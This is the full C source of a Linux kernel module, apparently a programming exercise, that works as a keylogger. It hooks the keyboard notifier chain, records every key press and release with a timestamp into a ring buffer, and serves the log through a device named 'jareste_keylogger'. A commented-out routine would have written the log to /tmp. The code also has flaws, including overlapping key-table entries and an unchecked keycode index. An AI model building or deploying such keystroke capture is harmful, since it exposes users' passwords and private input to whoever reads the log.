#include <linux/module.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>
#include <linux/ktime.h>
#include <linux/input.h>
#include <linux/slab.h>

#define BUF_SIZE 4096 * 4 /* 16 Kb */

typedef struct {
    const char *name;
} KeyMap;

KeyMap key_table[] = {
    [0] = {"Reserved"},
    [1] = {"Esc"},
    [2] = {"1"},
    [3] = {"2"},
    [4] = {"3"},
    [5] = {"4"},
    [6] = {"5"},
    [7] = {"6"},
    [8] = {"7"},
    [9] = {"8"},
    [10] = {"9"},
    [11] = {"0"},
    [12] = {"Minus"},
    [13] = {"Equal"},
    [14] = {"Backspace"},
    [15] = {"Tab"},
    [16] = {"Q"},
    [17] = {"W"},
    [18] = {"E"},
    [19] = {"R"},
    [20] = {"T"},
    [21] = {"Y"},
    [22] = {"U"},
    [23] = {"I"},
    [24] = {"O"},
    [25] = {"P"},
    [26] = {"Left Brace"},
    [27] = {"Right Brace"},
    [28] = {"Enter"},
    [29] = {"Left Ctrl"},
    [30] = {"A"},
    [31] = {"S"},
    [32] = {"D"},
    [33] = {"F"},
    [34] = {"G"},
    [35] = {"H"},
    [36] = {"J"},
    [37] = {"K"},
    [38] = {"L"},
    [39] = {"Semicolon"},
    [40] = {"Apostrophe"},
    [41] = {"Grave"},
    [42] = {"Left Shift"},
    [43] = {"Backslash"},
    [44] = {"Z"},
    [45] = {"X"},
    [46] = {"C"},
    [47] = {"V"},
    [48] = {"B"},
    [49] = {"N"},
    [50] = {"M"},
    [51] = {"Comma"},
    [52] = {"Dot"},
    [53] = {"Slash"},
    [54] = {"Right Shift"},
    [55] = {"Keypad *"},
    [56] = {"Left Alt"},
    [57] = {"Space"},
    [58] = {"Caps Lock"},
    [59] = {"F1"},
    [60] = {"F2"},
    [61] = {"F3"},
    [62] = {"F4"},
    [63] = {"F5"},
    [64] = {"F6"},
    [65] = {"F7"},
    [66] = {"F8"},
    [67] = {"F9"},
    [68] = {"F10"},
    [69] = {"Num Lock"},
    [70] = {"F14"},
    [71] = {"Keypad 7"},
    [72] = {"Keypad 8"},
    [73] = {"Keypad 9"},
    [74] = {"Keypad -"},
    [75] = {"Keypad 4"},
    [76] = {"Keypad 5"},
    [77] = {"Keypad 6"},
    [78] = {"Keypad +"},
    [79] = {"Keypad 1"},
    [80] = {"Keypad 2"},
    [81] = {"Keypad 3"},
    [82] = {"Keypad 0"},
    [83] = {"Keypad Dot"},
    [84] = {"Unknown"},
    [85] = {"F11"},
    [86] = {"F12"},
    [87 ... 90] = {"Reserved"},
    [91] = {"Keypad Enter"},
    [92] = {"Right Ctrl"},
    [93] = {"Keypad /"},
    [94] = {"Right Alt"},
    [95] = {"Home"},
    [96] = {"Keypad Enter"},
    [97] = {"Page Up"},
    [98] = {"Keypad /"},
    [99] = {"F13"},
    [100] = {"Right Alt"},
    [101] = {"Arrow Down"},
    [102] = {"Home"},
    [103] = {"Arrow up"},
    [104] = {"Page up"},
    [105] = {"Arrow Left"},
    [106] = {"Arrow Right"},
    [107] = {"End"},
    [108] = {"Arrow Down"},
    [109] = {"Page Down"},
    [110] = {"Insert"},    
    [111] = {"Delete"},
    [112] = {"Keypad Equal"},
    [113 ... 119] = {"Reserved"},
    [119] = {"F15"},
    [120 ... 124] = {"Reserved"},
    [125] = {"Command Left"},
    [126] = {"Command Right"},
    [127] = {"Menu"},
    [128 ... 255] = {"Reserved"},
};


static char log_buffer[BUF_SIZE];
static size_t log_start = 0;
static size_t log_end = 0;
static DEFINE_MUTEX(log_lock);

static int key_event_notifier(struct notifier_block *nb, unsigned long action, void *data);
static ssize_t keyboard_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);

static struct notifier_block nb = {
    .notifier_call = key_event_notifier,
};

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = keyboard_read,
};

static struct miscdevice keyboard_misc_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "jareste_keylogger",
    .fops = &fops,
};

static int key_event_notifier(struct notifier_block *nb, unsigned long action, void *data)
{
    struct keyboard_notifier_param *param = data;
    char entry[128];
    int len;
    static unsigned int last_keycode = 0;
    static int last_keydown = -1;

    if (action == KBD_KEYCODE)
    {
        struct timespec64 ts;
        struct tm tm;

        ktime_get_real_ts64(&ts);
        time64_to_tm(ts.tv_sec, 0, &tm);

        len = snprintf(entry, sizeof(entry), "%02d:%02d:%02d: %s (%u) %s\n",
                       tm.tm_hour, tm.tm_min, tm.tm_sec,
                       key_table[param->value].name, param->value,
                       param->down ? "Pressed" : "Released");

        mutex_lock(&log_lock);

        if (param->down == last_keydown && param->value == last_keycode)
        {
            mutex_unlock(&log_lock);
            return NOTIFY_OK;
        }

        last_keycode = param->value;
        last_keydown = param->down;

        while ((log_end + len) % BUF_SIZE == log_start)
        {
            size_t first_entry_len = strnlen(log_buffer + log_start, BUF_SIZE - log_start) + 1;
            log_start = (log_start + first_entry_len) % BUF_SIZE;
        }

        if (len <= BUF_SIZE)
        {
            if (log_end + len <= BUF_SIZE)
            {
                memcpy(log_buffer + log_end, entry, len);
            }
            else
            {
                size_t first_chunk = BUF_SIZE - log_end;
                memcpy(log_buffer + log_end, entry, first_chunk);
                memcpy(log_buffer, entry + first_chunk, len - first_chunk);
            }
            log_end = (log_end + len) % BUF_SIZE;
        }
        mutex_unlock(&log_lock);
    }
    return NOTIFY_OK;
}

static ssize_t keyboard_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
    ssize_t ret = 0;

    mutex_lock(&log_lock);

    if (log_start != log_end)
    {
        size_t available_data;

        if (log_start < log_end)
            available_data = log_end - log_start;
        else
            available_data = BUF_SIZE - log_start + log_end;

        ret = min(count, available_data);

        if (log_start + ret <= BUF_SIZE)
        {
            if (copy_to_user(buf, log_buffer + log_start, ret))
                ret = -EFAULT;
        }
        else
        {
            size_t first_chunk = BUF_SIZE - log_start;
            if (copy_to_user(buf, log_buffer + log_start, first_chunk) ||
                copy_to_user(buf + first_chunk, log_buffer, ret - first_chunk))
            {
                ret = -EFAULT;
            }
        }

        if (ret > 0)
            log_start = (log_start + ret) % BUF_SIZE;

        *ppos += ret;
    }

    mutex_unlock(&log_lock);
    return ret;
}

static int __init keyboard_init(void)
{
    int ret;

    ret = misc_register(&keyboard_misc_device);
    if (ret)
        return ret;

    ret = register_keyboard_notifier(&nb);
    if (ret)
        misc_deregister(&keyboard_misc_device);

    return ret;
}

static void keyboard_exit(void)
{
    // struct file *file;
    // mm_segment_t old_fs;
    // loff_t pos = 0;
    // ssize_t ret;

    // // Open the file for writing
    // file = filp_open("/tmp/keys_logs.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    // if (IS_ERR(file)) {
    //     pr_err("Failed to open /tmp/keys_logs.txt\n");
    //     return;
    // }

    // // Change the address limit to allow kernel access to user space
    // old_fs = get_fs();
    // set_fs(KERNEL_DS);

    // // Write the log buffer to the file
    // mutex_lock(&log_lock);
    // ret = kernel_write(file, log_buffer, log_index, &pos);
    // mutex_unlock(&log_lock);

    // if (ret < 0) {
    //     pr_err("Failed to write to /tmp/keys_logs.txt\n");
    // }

    // // Restore the address limit
    // set_fs(old_fs);

    // // Close the file
    // filp_close(file, NULL);

    unregister_keyboard_notifier(&nb);
    misc_deregister(&keyboard_misc_device);
}

module_init(keyboard_init);
module_exit(keyboard_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("jareste-");
MODULE_DESCRIPTION("Keyboard logger");
